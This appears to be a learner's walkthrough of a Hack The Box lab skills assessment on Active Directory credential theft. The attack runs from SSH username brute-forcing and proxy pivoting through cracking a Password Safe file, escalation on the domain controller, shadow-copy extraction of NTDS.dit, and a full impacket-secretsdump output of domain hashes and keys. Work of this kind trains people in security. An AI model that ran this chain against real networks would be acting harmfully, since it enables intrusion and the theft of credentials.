## The Credential Theft Shuffle

[The Credential Theft Shuffle](https://adsecurity.org/?p=2362), as coined by `Sean Metcalf`, is a systematic approach attackers use to compromise Active Directory environments by exploiting `stolen credentials`. The process begins with gaining initial access, often through phishing, followed by obtaining local administrator privileges on a machine. Attackers then extract credentials from memory using tools like Mimikatz and leverage these credentials to `move laterally across the network`. Techniques such as pass-the-hash (PtH) and tools like NetExec facilitate this lateral movement and further credential harvesting. The ultimate goal is to escalate privileges and `gain control over the domain`, often by compromising Domain Admin accounts or performing DCSync attacks. Sean emphasizes the importance of implementing security measures such as the `Local Administrator Password Solution (LAPS)`, enforcing `multi-factor authentication`, and `restricting administrative privileges` to mitigate such attacks.

## Skills Assessment

`Betty Jayde` works at `Nexura LLC`. We know she uses the password `Texas123!@#` on multiple websites, and we believe she may reuse it at work. Infiltrate Nexura's network and gain command execution on the domain controller. The following hosts are in-scope for this assessment:

|Host|IP Address|
|---|---|
|`DMZ01`|`10.129.*.*` **(External)**, `172.16.119.13` **(Internal)**|
|`JUMP01`|`172.16.119.7`|
|`FILE01`|`172.16.119.10`|
|`DC01`|`172.16.119.11`|

#### Pivoting Primer

The internal hosts (`JUMP01`, `FILE01`, `DC01`) reside on a private subnet that is not directly accessible from our attack host. The only externally reachable system is `DMZ01`, which has a second interface connected to the internal network. This segmentation reflects a classic DMZ setup, where public-facing services are isolated from internal infrastructure.

To access these internal systems, we must first gain a foothold on `DMZ01`. From there, we can `pivot` — that is, route our traffic through the compromised host into the private network. This enables our tools to communicate with internal hosts as if they were directly accessible. After compromising the DMZ, refer to the module `cheatsheet` for the necessary commands to set up the pivot and continue your assessment.

###### Exercise and only Question

Steps for getting the answer

Step 1. connect openvpn through the file downloaded from htb module.
![[Pasted image 20260803231736.png]]

Step2. We will find open ports via nmap command.
![[Pasted image 20260803231906.png]]

Step3. As we know that ssh port is open so now we will connect the target machine via ssh with given credentials by name (betty jade) and password (Texas123!@#) but first we have first find the username to login into ssh so we will use hydra for username verification. I have already created a detailed username list to get the login and saved the file by the name of users.txt.
![[Pasted image 20260803233002.png]]

Step4. We have now get the login credentials for the ssh. username-jbetty password-Texas123!@#
![[Pasted image 20260803233650.png]]

Step 5. Now we will log in via ssh and create a tunnel for internal lateral movement to get access to internal network.
![[Pasted image 20260808105718.png]]

Step6. Now before connecting to ssh we will setup few things for the internal lateral movement. First we will set up proxychain server to connect to internal network. we will add a line in the last of the file for setting the proxy.
![[Screenshot From 2026-08-08 11-10-05.png]]

Step7. Now we will use nmap from main attacking machine via proxychains to know the open ports of internal networks and we will only go for AD ports. (Jump Box)

![[Pasted image 20260810163341.png]]

Step8. Now we will connect to jumpbox via rdp but before that we have to find credentials to login via rdp the credentials we have used before to login ssh will not work so we have to find new credentials in the target machine. We will use history command and also filter the commands used to get the creds to login.
![[Pasted image 20260810165802.png]]

Step9.  Now we will login into rdp via xfreerdp command to Jump01 also known jump box. We will be using the credentials which we found and also connect our main pc folder via rdp as well as shown below. We will also take the password locked file found in \\file01\HR\Archive\Employee-Passwords_OLD.psafe3 to our main attacking pc.
![[Pasted image 20260810165938.png]]
![[Pasted image 20260810170310.png]]
![[Pasted image 20260810170104.png]]

Step10. After obtaining the file from the target machine via rdp we will now crack the password file via using john the ripper to get password safe creds to get more user. as shown below. first we will convert the file into hash txt file via pwsafe2john command.
![[Pasted image 20260810174359.png]]
b. Now we will edit the file to crack the hash.
![[Pasted image 20260810174521.png]]
c. Now we will crack the hash via john the ripper. And we have got the password.
![[Pasted image 20260810175643.png]]

Step11. Now we will login into Password safe application in windows rdp which we logged in earlier. We will able to see the domain users.
![[Pasted image 20260810180514.png]]

Step12. As we double click on any user a prompt comes up to copy the password. and click on OK.
![[Pasted image 20260810183737.png]]

Step13. Now we will rdp into stom Account by his password copied by password safe. we will use dc01 machine to log into stom account. we will also mount a folder from main pc via rdp as well.
![[Pasted image 20260810203714.png]]
![[Pasted image 20260810192924.png]]

Step14. Now we will open the cmd and confirm the local admins and `SeDebugPrivilege`/local admin on DC01.
```cmd
Microsoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\stom>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeMachineAccountPrivilege     Add workstations to domain     Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled

C:\Users\stom>^V
'' is not recognized as an internal or external command,
operable program or batch file.

C:\Users\stom>whoami /groups

GROUP INFORMATION
-----------------

Group Name                                    Type             SID                                           Attributes
============================================= ================ ============================================= ===============================================================
Everyone                                      Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                                 Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access    Alias            S-1-5-32-554                                  Group used for deny only
BUILTIN\Administrators                        Alias            S-1-5-32-544                                  Group used for deny only
NT AUTHORITY\REMOTE INTERACTIVE LOGON         Well-known group S-1-5-14                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE                      Well-known group S-1-5-4                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users              Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization                Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
LOCAL                                         Well-known group S-1-2-0                                       Mandatory group, Enabled by default, Enabled group
NEXURA\MANAGEMENT                             Group            S-1-5-21-1333759777-277832620-2286231135-1112 Mandatory group, Enabled by default, Enabled group
NEXURA\Domain Admins                          Group            S-1-5-21-1333759777-277832620-2286231135-512  Group used for deny only
Authentication authority asserted identity    Well-known group S-1-18-1                                      Mandatory group, Enabled by default, Enabled group
NEXURA\Denied RODC Password Replication Group Alias            S-1-5-21-1333759777-277832620-2286231135-572  Mandatory group, Enabled by default, Enabled group, Local Group
Mandatory Label\Medium Mandatory Level        Label            S-1-16-8192
```
```
```

Step15. Now we will shadow copy and extract **ntds.dit** and **SYSTEM** hive, but before that we will elevate from normal user to admin and verify it as well.
```cmd
Microsoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\stom>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeMachineAccountPrivilege     Add workstations to domain     Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled

C:\Users\stom>^V
'' is not recognized as an internal or external command,
operable program or batch file.

C:\Users\stom>whoami /groups

GROUP INFORMATION
-----------------

Group Name                                    Type             SID                                           Attributes
============================================= ================ ============================================= ===============================================================
Everyone                                      Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                                 Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access    Alias            S-1-5-32-554                                  Group used for deny only
BUILTIN\Administrators                        Alias            S-1-5-32-544                                  Group used for deny only
NT AUTHORITY\REMOTE INTERACTIVE LOGON         Well-known group S-1-5-14                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE                      Well-known group S-1-5-4                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users              Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization                Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
LOCAL                                         Well-known group S-1-2-0                                       Mandatory group, Enabled by default, Enabled group
NEXURA\MANAGEMENT                             Group            S-1-5-21-1333759777-277832620-2286231135-1112 Mandatory group, Enabled by default, Enabled group
NEXURA\Domain Admins                          Group            S-1-5-21-1333759777-277832620-2286231135-512  Group used for deny only
Authentication authority asserted identity    Well-known group S-1-18-1                                      Mandatory group, Enabled by default, Enabled group
NEXURA\Denied RODC Password Replication Group Alias            S-1-5-21-1333759777-277832620-2286231135-572  Mandatory group, Enabled by default, Enabled group, Local Group
Mandatory Label\Medium Mandatory Level        Label            S-1-16-8192

C:\Users\stom>powershell Start-Process cmd -Verb runAs

C:\Users\stom>
```
```
```
b. System escalated to admin and verified.
```cmd
Microsoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== ========
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
SeMachineAccountPrivilege                 Add workstations to domain                                         Disabled
SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
SeSystemProfilePrivilege                  Profile system performance                                         Disabled
SeSystemtimePrivilege                     Change the system time                                             Disabled
SeProfileSingleProcessPrivilege           Profile single process                                             Disabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Disabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Disabled
SeBackupPrivilege                         Back up files and directories                                      Disabled
SeRestorePrivilege                        Restore files and directories                                      Disabled
SeShutdownPrivilege                       Shut down the system                                               Disabled
SeDebugPrivilege                          Debug programs                                                     Disabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Disabled
SeUndockPrivilege                         Remove computer from docking station                               Disabled
SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Disabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Disabled
SeTimeZonePrivilege                       Change the time zone                                               Disabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Disabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Disabled
```

Step16. We will now proceed with the **ntds.dit** and **SYSTEM** hive.
```cmd
C:\Windows\system32>vssadmin create shadow /for=C:
vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
(C) Copyright 2001-2013 Microsoft Corp.

Successfully created shadow copy for 'C:\'
    Shadow Copy ID: {4015b1bf-4fda-405e-ac3c-3c6769ff3727}
    Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
```

Step17. We will now create a NTDS folder for our extracted ntds and system hive. we will copy both files to the NTDS folder and verified it as well.
```cmd
C:\Windows\system32>mkdir C:\NTDS

C:\Windows\system32>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\NTDS\NTDS.dit
        1 file(s) copied.

C:\Windows\system32>reg.exe save hklm\system C:\NTDS\SYSTEM
The operation completed successfully.

C:\Windows\system32>dir C:\NTDS
 Volume in drive C has no label.
 Volume Serial Number is C898-F1E2

 Directory of C:\NTDS

08/10/2026  09:25 AM    <DIR>          .
08/10/2026  09:25 AM    <DIR>          ..
08/10/2026  08:51 AM        16,777,216 NTDS.dit
08/10/2026  09:25 AM        16,228,352 SYSTEM
               2 File(s)     33,005,568 bytes
               2 Dir(s)   5,683,712,000 bytes free

C:\Windows\system32>
```

Step18. We will now pull the folder to our main pc by the folder we shared via rdp. see as below and verified as well.
```bash
┌──(root㉿kali)-[~]
└─# ls -la /home/arjun/Downloads/cyber/                                           
total 11728
drwxrwxr-x 5 arjun arjun     4096 Aug 10 19:58 .
drwxr-xr-x 4 arjun arjun     4096 Aug 10 18:17 ..
-rwxrwxr-x 1 arjun arjun 10571938 Jul 28 10:18 chisel
-rw-rw-r-- 1 arjun arjun   123545 Jun 27 15:18 E9pA6qsdbeyEkp3ti_9PBTqmSxAf6zZTseP_hxWx8CarBpqdC4phk_1782553591180_completion_certificate.pdf
-rw-rw-r-- 1 root  root      1080 Apr 29  2025 Employee-Passwords_OLD.psafe3
drwxr-xr-x 2 root  root     24576 Jul 24 13:01 loot
-rw-rw-r-- 1 arjun arjun  1250056 Aug 10 18:16 mimikatz.exe
drwx------ 2 root  root      4096 Aug 10 20:05 NTDS
drwxrwxr-x 6 root  root      4096 Jul 19 12:05 PowerHuntShares
-rw-rw-r-- 1 root  root       171 Aug 10 17:47 pwhash2.txt
-rw-rw-r-- 1 root  root       148 Aug 10 17:45 pwhash.txt                                                                                  
┌──(root㉿kali)-[~]
└─# cd /home/arjun/Downloads/cyber/NTDS

┌──(root㉿kali)-[/home/arjun/Downloads/cyber/NTDS]
└─# ls                                 
NTDS.dit  SYSTEM
```

Step19. Now we will extract the secrets via impacket command and we will get our answer.
```bash

┌──(root㉿kali)-[/home/arjun/Downloads/cyber/NTDS]
└─# impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
^[[6~Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x76b4393403c75a0cb93633c17abf2778
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 9bf8b490fffee672ecfe3bc67e0daf69
[*] Reading and decrypting hashes from NTDS.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:36e09e1e6ade94d63fbcab5e5b8d6d23:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC01$:1002:aad3b435b51404eeaad3b435b51404ee:60b488a143608d77968aceebe7b65940:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:11dee8f685882eb4f78a450291569bd0:::
nexura.htb\bdavid:1105:aad3b435b51404eeaad3b435b51404ee:82c5ef7f2612567964070d04fe46a5d0:::
nexura.htb\stom:1106:aad3b435b51404eeaad3b435b51404ee:21ea958524cfd9a7791737f8d2f764fa:::
nexura.htb\hwilliam:1107:aad3b435b51404eeaad3b435b51404ee:f3ac86b290a51fb59a1a66f50b658e1f:::
FILE01$:1108:aad3b435b51404eeaad3b435b51404ee:b7374a9de2bf6951a5c66a7675df7f2f:::
JUMP01$:1109:aad3b435b51404eeaad3b435b51404ee:7bef0ee0b472d2c5805921324525f321:::
[*] Kerberos keys from NTDS.dit 
Administrator:aes256-cts-hmac-sha1-96:cd6a08bd2809d10a4bd3d41bc0e3ed0e21c7559961edc58209d190aaf9cb02a8
Administrator:aes128-cts-hmac-sha1-96:6743a42ac84aa2c5c1441aa64c03a3f0
Administrator:des-cbc-md5:5ec10792619bfb6e
DC01$:aes256-cts-hmac-sha1-96:0dbd2117deb476358bbc3e7986232e15d9ef60618017dfae723aa8cda4c6b481
DC01$:aes128-cts-hmac-sha1-96:6e095677bb563a00d8bc2e13fe504ed2
DC01$:des-cbc-md5:ceb3805b8abf6b2f
krbtgt:aes256-cts-hmac-sha1-96:69e5591bfd4ca06737b9e29da1dc77611b1e33af7537bccbef3040c5d2ddc09f
krbtgt:aes128-cts-hmac-sha1-96:9ffbdd5ba3b47488803901aa70b331ee
krbtgt:des-cbc-md5:587c384a7a793e6d
nexura.htb\bdavid:aes256-cts-hmac-sha1-96:f7f6449b2788bf507230a6f6e79c5accf17b060dc7d50e2446d91397f8092dee
nexura.htb\bdavid:aes128-cts-hmac-sha1-96:921921f196fc51d33e9fb279345fb351
nexura.htb\bdavid:des-cbc-md5:520eb6dc0d51409d
nexura.htb\stom:aes256-cts-hmac-sha1-96:63486142af3957430832a4bdcc9e984ef4e397cf6c78a7bb5ab9adfb07ce22da
nexura.htb\stom:aes128-cts-hmac-sha1-96:c61d601cb033f183e25a135d3a396cad
nexura.htb\stom:des-cbc-md5:2f8f46c2fe49e6fe
nexura.htb\hwilliam:aes256-cts-hmac-sha1-96:6f098c0966f8a46698cd2d3b258856b26811bbd120dd0c6b6b62156035e4ebe9
nexura.htb\hwilliam:aes128-cts-hmac-sha1-96:2fb4de7ead6bc5f5e278596ba7f29be1
nexura.htb\hwilliam:des-cbc-md5:c1676b54e061c7ae
FILE01$:aes256-cts-hmac-sha1-96:ffaf60d490100bff3aa2becad0c14f6cbdc5316cebc62ecf1884fbd3218cb938
FILE01$:aes128-cts-hmac-sha1-96:f6f29e95a1e17053eb0b88a25d373bf9
FILE01$:des-cbc-md5:d6a1c72358e50bb6
JUMP01$:aes256-cts-hmac-sha1-96:9521aa66829ccb2e8263c0fd7ac25e909bba456a1474ecac6676ace5ce7a812b
JUMP01$:aes128-cts-hmac-sha1-96:37d4bc9e0e866864ab16a4d5d70f4b70
JUMP01$:des-cbc-md5:a715e9eaf761b083
[*] Cleaning up...
```

